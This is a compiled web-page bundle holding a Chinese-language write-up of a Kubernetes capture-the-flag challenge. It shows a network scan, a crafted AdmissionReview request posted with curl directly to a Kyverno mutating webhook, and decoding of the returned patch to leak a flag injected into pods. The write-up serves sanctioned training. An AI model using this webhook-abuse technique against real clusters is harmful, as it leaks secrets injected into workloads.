"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[1964],{46341:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>_,contentTitle:()=>c,default:()=>d,frontMatter:()=>o,metadata:()=>r,toc:()=>t});const r=JSON.parse('{"id":"Independent-Environment/K8sLanParty/5","title":"Lateral Movement","description":"Who will guard the guardians?","source":"@site/docs/Independent-Environment/K8sLanParty/5.md","sourceDirName":"Independent-Environment/K8sLanParty","slug":"/Independent-Environment/K8sLanParty/5","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/K8sLanParty/5","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/K8sLanParty/5.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"Bypassing Boundaries","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/K8sLanParty/4"},"next":{"title":"OverTheWire","permalink":"/Target-Machines-WriteUp/docs/category/OverTheWire"}}');var a=s(74848),i=s(28453);const o={},c="Lateral Movement",_={},t=[];function l(n){const e={a:"a",admonition:"admonition",code:"code",h1:"h1",header:"header",p:"p",pre:"pre",...(0,i.R)(),...n.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(e.header,{children:(0,a.jsx)(e.h1,{id:"lateral-movement",children:"Lateral Movement"})}),"\n",(0,a.jsxs)(e.admonition,{type:"note",children:[(0,a.jsx)(e.p,{children:"Who will guard the guardians?"}),(0,a.jsx)(e.p,{children:"Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the administrative services."}),(0,a.jsx)(e.p,{children:"\u5f53 Pod \u88ab\u5916\u90e8\u673a\u5236\u7be1\u6539\u65f6\uff0c\u53ef\u4ee5\u5229\u7528\u5176\u7e41\u7410\u7684\u7ba1\u7406\u6d41\u7a0b\uff0c\u4ece\u7ba1\u7406\u670d\u52a1\u4e2d\u6cc4\u9732\u654f\u611f\u4fe1\u606f\u3002"})]}),"\n",(0,a.jsx)(e.p,{children:"\u9898\u76ee\u63d0\u4f9b\u4e86\u7b56\u7565"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-yaml",children:'apiVersion: kyverno.io/v1\nkind: Policy\nmetadata:\n  name: apply-flag-to-env\n  namespace: sensitive-ns\nspec:\n  rules:\n    - name: inject-env-vars\n      match:\n        resources:\n          kinds:\n            - Pod\n      mutate:\n        patchStrategicMerge:\n          spec:\n            containers:\n              - name: "*"\n                env:\n                  - name: FLAG\n                    value: "{flag}"\n'})}),"\n",(0,a.jsxs)(e.p,{children:["\u53ef\u4ee5\u5f97\u77e5\uff0c\u5728\u5bb9\u5668\u8fd0\u884c\u540e\uff0c",(0,a.jsx)(e.code,{children:"kyverno"})," \u4f1a\u81ea\u52a8\u4e3a ",(0,a.jsx)(e.code,{children:"sensitive-ns namespace"})," \u91cc\u7684 ",(0,a.jsx)(e.code,{children:"pod"})," \u4ece\u73af\u5883\u53d8\u91cf\u6ce8\u5165 ",(0,a.jsx)(e.code,{children:"flag"})]}),"\n",(0,a.jsxs)(e.p,{children:["\u90a3\u4e5f\u5c31\u610f\u5473\u7740\uff0c\u9700\u8981\u5728 ",(0,a.jsx)(e.code,{children:"sensitive-ns"})," \u4e2d\u521b\u5efa\u4e00\u4e2a pod \u5bb9\u5668\u4e4b\u540e\uff0c\u5728\u5bb9\u5668\u5185\u7684\u73af\u5883\u53d8\u91cf\u4e2d\u5f97\u5230 flag"]}),"\n",(0,a.jsx)(e.p,{children:"\u9996\u5148\uff0c\u8fd8\u662f\u6267\u884c\u4e00\u6ce2\u626b\u63cf"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.0/16\n22196 / 65536 [----------------------------------------------------\x3e_______________________________________________________________________________________________________] 33.87% 967 p/s10.100.86.210 kyverno-cleanup-controller.kyverno.svc.cluster.local.\n32234 / 65536 [----------------------------------------------------------------------------\x3e_______________________________________________________________________________] 49.19% 965 p/s10.100.126.98 kyverno-svc-metrics.kyverno.svc.cluster.local.\n40521 / 65536 [------------------------------------------------------------------------------------------------\x3e___________________________________________________________] 61.83% 965 p/s10.100.158.213 kyverno-reports-controller-metrics.kyverno.svc.cluster.local.\n43792 / 65536 [--------------------------------------------------------------------------------------------------------\x3e___________________________________________________] 66.82% 963 p/s10.100.171.174 kyverno-background-controller-metrics.kyverno.svc.cluster.local.\n55742 / 65536 [------------------------------------------------------------------------------------------------------------------------------------\x3e_______________________] 85.06% 964 p/s10.100.217.223 kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.\n59243 / 65536 [---------------------------------------------------------------------------------------------------------------------------------------------\x3e______________] 90.40% 967 p/s10.100.232.19 kyverno-svc.kyverno.svc.cluster.local.\n65378 / 65536 [-----------------------------------------------------------------------------------------------------------------------------------------------------------\x3e] 99.76% 963 p/s10.100.86.210 -> kyverno-cleanup-controller.kyverno.svc.cluster.local.\n10.100.126.98 -> kyverno-svc-metrics.kyverno.svc.cluster.local.\n10.100.158.213 -> kyverno-reports-controller-metrics.kyverno.svc.cluster.local.\n10.100.171.174 -> kyverno-background-controller-metrics.kyverno.svc.cluster.local.\n10.100.217.223 -> kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.\n10.100.232.19 -> kyverno-svc.kyverno.svc.cluster.local.\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u9996\u5148\uff0c\u7f16\u5199\u4e00\u4efd ",(0,a.jsx)(e.code,{children:"pod.yaml"})]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-yaml",children:"apiVersion: v1\nkind: Pod\nmetadata:\n  name: curl-flag\n  namespace: sensitive-ns\nspec:\n  containers:\n  - name: curl-container\n    image: curlimages/curl\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u7136\u540e\u4f7f\u7528 ",(0,a.jsx)(e.a,{href:"https://github.com/anderseknert/kube-review",children:"anderseknert/kube-review"})," \u5c06 Kubernetes \u8d44\u6e90\u8f6c\u6362\u4e3a Kubernetes AdvisoryReview \u8bf7\u6c42"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-json",children:'\u250c\u2500\u2500(randark\u327fkali)-[~/tmp]\n\u2514\u2500$ ~/tools/kube-review-linux-amd64 create pod.yaml \n{\n    "kind": "AdmissionReview",\n    "apiVersion": "admission.k8s.io/v1",\n    "request": {\n        "uid": "f2bed072-5fdd-4e5b-a080-168faf73899c",\n        "kind": {\n            "group": "",\n            "version": "v1",\n            "kind": "Pod"\n        },\n        "resource": {\n            "group": "",\n            "version": "v1",\n            "resource": "pods"\n        },\n        "requestKind": {\n            "group": "",\n            "version": "v1",\n            "kind": "Pod"\n        },\n        "requestResource": {\n            "group": "",\n            "version": "v1",\n            "resource": "pods"\n        },\n        "name": "curl-flag",\n        "namespace": "sensitive-ns",\n        "operation": "CREATE",\n        "userInfo": {\n            "username": "kube-review",\n            "uid": "97530c01-d8ea-4ed1-a7ce-7f07466e7bf8"\n        },\n        "object": {\n            "kind": "Pod",\n            "apiVersion": "v1",\n            "metadata": {\n                "name": "curl-flag",\n                "namespace": "sensitive-ns",\n                "creationTimestamp": null\n            },\n            "spec": {\n                "containers": [\n                    {\n                        "name": "curl-container",\n                        "image": "curlimages/curl",\n                        "resources": {}\n                    }\n                ]\n            },\n            "status": {}\n        },\n        "oldObject": null,\n        "dryRun": true,\n        "options": {\n            "kind": "CreateOptions",\n            "apiVersion": "meta.k8s.io/v1"\n        }\n    }\n}\n'})}),"\n",(0,a.jsxs)(e.p,{children:["\u7136\u540e\u5bf9",(0,a.jsx)(e.code,{children:"kyverno-svc-metrics.kyverno.svc.cluster.local"}),"\u53d1\u9001\u8bf7\u6c42"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:'player@wiz-k8s-lan-party:~$ curl -k -X POST \\\n> https://kyverno-svc.kyverno.svc.cluster.local:443/mutate \\\n>   -H \'content-type: application/json\' \\\n>   -d \'{\n>     "kind": "AdmissionReview",\n>     "apiVersion": "admission.k8s.io/v1",\n>     "request": {\n>         "uid": "4cff4c58-75ba-4c4b-97e8-a972f3fc3ff3",\n>         "kind": {\n>             "group": "",\n>             "version": "v1",\n>             "kind": "Pod"\n>         },\n>         "resource": {\n>             "group": "",\n>             "version": "v1",\n>             "resource": "pods"\n>         },\n>         "requestKind": {\n>             "group": "",\n>             "version": "v1",\n>             "kind": "Pod"\n>         },\n>         "requestResource": {\n>             "group": "",\n>             "version": "v1",\n>             "resource": "pods"\n>         },\n>         "name": "curl-flag",\n>         "namespace": "sensitive-ns",\n>         "operation": "CREATE",\n>         "userInfo": {\n>             "username": "kube-review",\n>             "uid": "ca06bc76-7f37-4fcf-af63-5a07fb0c4204"\n>         },\n>         "object": {\n>             "kind": "Pod",\n>             "apiVersion": "v1",\n>             "metadata": {\n>                 "name": "curl-flag",\n>                 "namespace": "sensitive-ns",\n>                 "creationTimestamp": null\n>             },\n>             "spec": {\n>                 "containers": [\n>                     {\n>                         "name": "curl-container",\n>                         "image": "curlimages/curl",\n>                         "resources": {}\n>                     }\n>                 ]\n>             },\n>             "status": {}\n>         },\n>         "oldObject": null,\n>         "dryRun": true,\n>         "options": {\n>             "kind": "CreateOptions",\n>             "apiVersion": "meta.k8s.io/v1"\n>         }\n>     }\n> }\'\n{"kind":"AdmissionReview","apiVersion":"admission.k8s.io/v1","request":{"uid":"4cff4c58-75ba-4c4b-97e8-a972f3fc3ff3","kind":{"group":"","version":"v1","kind":"Pod"},"resource":{"group":"","version":"v1","resource":"pods"},"requestKind":{"group":"","version":"v1","kind":"Pod"},"requestResource":{"group":"","version":"v1","resource":"pods"},"name":"curl-flag","namespace":"sensitive-ns","operation":"CREATE","userInfo":{"username":"kube-review","uid":"ca06bc76-7f37-4fcf-af63-5a07fb0c4204"},"object":{"kind":"Pod","apiVersion":"v1","metadata":{"name":"curl-flag","namespace":"sensitive-ns","creationTimestamp":null},"spec":{"containers":[{"name":"curl-container","image":"curlimages/curl","resources":{}}]},"status":{}},"oldObject":null,"dryRun":true,"options":{"kind":"CreateOptions","apiVersion":"meta.k8s.io/v1"}},"response":{"uid":"4cff4c58-75ba-4c4b-97e8-a972f3fc3ff3","allowed":true,"patch":"W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d","patchType":"JSONPatch"}}\n'})}),"\n",(0,a.jsx)(e.p,{children:"\u5c06\u5f97\u5230\u7684\u8f93\u51fa\u89e3\u6790"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-json",children:'{\n    "kind": "AdmissionReview",\n    "apiVersion": "admission.k8s.io/v1",\n    "request": {\n        "uid": "4cff4c58-75ba-4c4b-97e8-a972f3fc3ff3",\n        "kind": {\n            "group": "",\n            "version": "v1",\n            "kind": "Pod"\n        },\n        "resource": {\n            "group": "",\n            "version": "v1",\n            "resource": "pods"\n        },\n        "requestKind": {\n            "group": "",\n            "version": "v1",\n            "kind": "Pod"\n        },\n        "requestResource": {\n            "group": "",\n            "version": "v1",\n            "resource": "pods"\n        },\n        "name": "curl-flag",\n        "namespace": "sensitive-ns",\n        "operation": "CREATE",\n        "userInfo": {\n            "username": "kube-review",\n            "uid": "ca06bc76-7f37-4fcf-af63-5a07fb0c4204"\n        },\n        "object": {\n            "kind": "Pod",\n            "apiVersion": "v1",\n            "metadata": {\n                "name": "curl-flag",\n                "namespace": "sensitive-ns",\n                "creationTimestamp": null\n            },\n            "spec": {\n                "containers": [\n                    {\n                        "name": "curl-container",\n                        "image": "curlimages/curl",\n                        "resources": {}\n                    }\n                ]\n            },\n            "status": {}\n        },\n        "oldObject": null,\n        "dryRun": true,\n        "options": {\n            "kind": "CreateOptions",\n            "apiVersion": "meta.k8s.io/v1"\n        }\n    },\n    "response": {\n        "uid": "4cff4c58-75ba-4c4b-97e8-a972f3fc3ff3",\n        "allowed": true,\n        "patch": "W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d",\n        "patchType": "JSONPatch"\n    }\n}\n'})}),"\n",(0,a.jsxs)(e.p,{children:["\u5bf9\u5176\u4e2d\u7684",(0,a.jsx)(e.code,{children:"patch"}),"\u5b57\u6bb5\u8fdb\u884c\u89e3\u7801\uff0c\u5373\u53ef\u5f97\u5230"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-json",children:'[\n    {\n        "op": "add",\n        "path": "/spec/containers/0/env",\n        "value": [\n            {\n                "name": "FLAG",\n                "value": "wiz_k8s_lan_party{you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory}"\n            }\n        ]\n    },\n    {\n        "path": "/metadata/annotations",\n        "op": "add",\n        "value": {\n            "policies.kyverno.io/last-applied-patches": "inject-env-vars.apply-flag-to-env.kyverno.io: added /spec/containers/0/env\\n"\n        }\n    }\n]\n'})}),"\n",(0,a.jsx)(e.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-flag",children:"wiz_k8s_lan_party{you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory}\n"})})]})}function d(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,a.jsx)(e,{...n,children:(0,a.jsx)(l,{...n})}):l(n)}},28453:(n,e,s)=>{s.d(e,{R:()=>o,x:()=>c});var r=s(96540);const a={},i=r.createContext(a);function o(n){const e=r.useContext(i);return r.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(a):n.components||a:o(n.components),r.createElement(i.Provider,{value:e},n.children)}}}]);